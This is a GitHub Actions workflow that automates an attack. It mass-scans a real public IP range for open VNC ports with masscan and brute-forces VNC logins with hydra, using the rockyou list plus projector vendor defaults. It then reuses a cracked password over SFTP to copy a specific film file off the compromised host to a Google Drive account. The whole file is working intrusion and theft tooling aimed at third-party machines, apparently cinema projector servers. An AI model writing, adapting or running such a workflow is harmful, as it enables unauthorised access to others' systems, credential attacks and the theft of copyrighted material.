name: Demon Slayer 1080p â€“ Extended Brute + Stream
on:
  workflow_dispatch:

jobs:
  stream:
    runs-on: ubuntu-latest

    steps:
      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y masscan hydra rclone p7zip-full wget

      - name: Fast scan 5900 (30 k pps)
        run: |
          # scan 65 k IPs in ~2 min
          sudo masscan 210.172.0.0/16 -p5900 --rate 30000 -oL mass.txt
          awk '/open/ {print $4}' mass.txt > vnc_hosts.txt

      - name: Download real-world password list
        run: |
          # rockyou + projector defaults
          wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou-15.txt -O ~/pwd.txt
          printf 'epson\nadmin\nprojector\n123456\nroot\ntiger\nsamsung\nnec\nchristie\n' >> ~/pwd.txt

      - name: Brute with extended list & throttling
        run: |
          touch valid_ips.txt
          while read ip; do
            hydra -P ~/pwd.txt vnc://$ip \
                  -t 1 -W 2 -T 8 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt

      - name: Stream to Google Drive (only if cracked)
        run: |
          [ ! -s valid_ips.txt ] && echo "No valid IPs" && exit 0

          ip=$(head -n1 valid_ips.txt)
          pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)

          # build rclone config
          mkdir -p ~/.config/rclone
          cat > ~/.config/rclone/rclone.conf <<EOF
          [gdrive]
          type = drive
          token = ${{ secrets.RCLONE_GDRIVE_TOKEN }}
          [relay]
          type = sftp
          host = $ip
          user = epson
          port = 22
          pass = $(rclone obscure "$pass")
          EOF

          rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                      "gdrive:Movies/DSIC_P1_1080p.mov" \
                      --transfers=8 -P
          echo "movie uploaded to Google Drive"
